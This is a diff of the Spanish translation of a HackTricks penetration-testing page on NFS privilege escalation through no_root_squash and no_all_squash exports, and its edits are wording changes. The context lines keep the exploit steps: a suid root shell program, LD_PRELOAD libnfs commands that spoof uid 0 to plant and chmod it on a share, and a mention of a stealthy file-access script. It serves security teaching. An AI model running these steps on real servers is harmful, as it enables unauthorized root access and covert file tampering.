@@ -17,7 +17,7 @@ Lee el archivo _ **/etc/exports** _, si encuentras algún directorio configurado
 
 **no\_root\_squash**: Esta opción básicamente otorga autoridad al usuario root en el cliente para acceder a archivos en el servidor NFS como root. Y esto puede tener serias implicaciones de seguridad.
 
-**no\_all\_squash:** Esto es similar a la opción **no\_root\_squash** pero se aplica a **usuarios que no son root**. Imagina, tienes una shell como usuario nobody; revisas el archivo /etc/exports; la opción no\_all\_squash está presente; revisas el archivo /etc/passwd; emulas un usuario que no es root; creas un archivo suid como ese usuario (montando usando nfs). Ejecutas el suid como usuario nobody y te conviertes en un usuario diferente.
+**no\_all\_squash:** Esto es similar a la opción **no\_root\_squash** pero se aplica a **usuarios no root**. Imagina, tienes una shell como usuario nobody; revisas el archivo /etc/exports; la opción no\_all\_squash está presente; revisas el archivo /etc/passwd; emulas un usuario no root; creas un archivo suid como ese usuario (montando usando nfs). Ejecutas el suid como usuario nobody y te conviertes en un usuario diferente.
 
 # Escalada de Privilegios
 
@@ -58,7 +58,7 @@ cd <SHAREDD_FOLDER>
 Ten en cuenta que si puedes crear un **túnel desde tu máquina hasta la máquina víctima, aún puedes usar la versión Remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
 El siguiente truco es en caso de que el archivo `/etc/exports` **indique una IP**. En este caso, **no podrás usar** en ningún caso el **exploit remoto** y necesitarás **abusar de este truco**.\
 Otro requisito necesario para que el exploit funcione es que **la exportación dentro de `/etc/export`** **debe estar utilizando la bandera `insecure`**.\
-\--_No estoy seguro de que si `/etc/export` está indicando una dirección IP, este truco funcionará_--
+\--_No estoy seguro de que si `/etc/export` está indicando una dirección IP este truco funcionará_--
 {% endhint %}
 
 ## Información Básica
@@ -76,7 +76,7 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### Realización del Exploit
 
-El exploit implica crear un programa C simple (`pwn.c`) que eleva los privilegios a root y luego ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el recurso compartido con suid root, utilizando `ld_nfs.so` para falsificar el uid en las llamadas RPC:
+El exploit implica crear un programa C simple (`pwn.c`) que eleva los privilegios a root y luego ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el share con suid root, utilizando `ld_nfs.so` para falsificar el uid en las llamadas RPC:
 
 1. **Compilar el código del exploit:**
 ```bash
@@ -85,7 +85,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Colocar el exploit en el recurso compartido y modificar sus permisos falsificando el uid:**
+2. **Colocar el exploit en el share y modificar sus permisos falsificando el uid:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -100,7 +100,7 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs:/
 ```
 
 ## Bono: NFShell para Acceso Sigiloso a Archivos
-Una vez obtenido el acceso root, para interactuar con el recurso compartido NFS sin cambiar la propiedad (para evitar dejar rastros), se utiliza un script de Python (nfsh.py). Este script ajusta el uid para que coincida con el del archivo al que se accede, permitiendo la interacción con archivos en el recurso compartido sin problemas de permisos:
+Una vez obtenido el acceso root, para interactuar con el share de NFS sin cambiar la propiedad (para evitar dejar rastros), se utiliza un script de Python (nfsh.py). Este script ajusta el uid para que coincida con el del archivo al que se accede, permitiendo la interacción con archivos en el share sin problemas de permisos:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -124,7 +124,7 @@ Ejecutar como:
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-# Referencias
+## Referencias
 * [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)
 
 
@@ -134,10 +134,10 @@ drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
